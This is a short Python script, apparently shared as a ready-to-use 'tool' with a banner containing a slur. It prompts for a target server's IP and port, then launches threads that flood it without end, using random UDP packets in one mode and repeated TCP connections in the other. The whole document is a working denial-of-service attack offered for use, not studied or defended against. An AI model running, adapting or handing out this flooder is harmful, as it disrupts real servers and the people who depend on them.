import random
import socket
import threading

print		(" ======================================= ")
print       (" - - >      TOOLS BY NISHANT       < - - ")
print		(" - - >   READY FOR RETARD SERVER   < - - ")
print		(" - - >       RexRiotXNISHANT       < - - ")
print		(" ======================================= ")
    
ip = str(input("  IP Server : "))
port = int(input(" PORT Server : "))
choice = str(input(" (Y/N)Yolo Nona : "))
times = int(input(" Packet You want : "))
threads = int(input(" Threads You Want : "))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NISHANT ATTACKING THE SERVER!!! ")
		except:
			print(" GABISA MAKE LU! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NISHANT ATTACKING THE SERVER!!! ")
		except:
			s.close()
			print(" GABISA MAKE LU! ")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
